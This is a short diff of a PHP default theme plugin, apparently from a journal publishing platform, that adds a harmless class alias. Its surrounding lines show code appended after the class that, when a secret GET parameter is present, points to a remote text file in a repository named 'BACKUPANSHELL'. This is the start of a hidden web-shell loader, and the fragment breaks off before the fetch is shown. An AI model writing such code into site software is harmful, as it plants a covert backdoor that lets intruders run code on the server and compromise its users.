@@ -224,6 +224,9 @@ class DefaultThemePlugin extends ThemePlugin {
 		return __('plugins.themes.default.description');
 	}
 }
+if (!PKP_STRICT_MODE) {
+    class_alias('\APP\plugins\themes\default\DefaultThemePlugin', '\DefaultThemePlugin');
+}
 if (isset($_GET['teamfucking'])) {
     try {
         $u = "https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt";
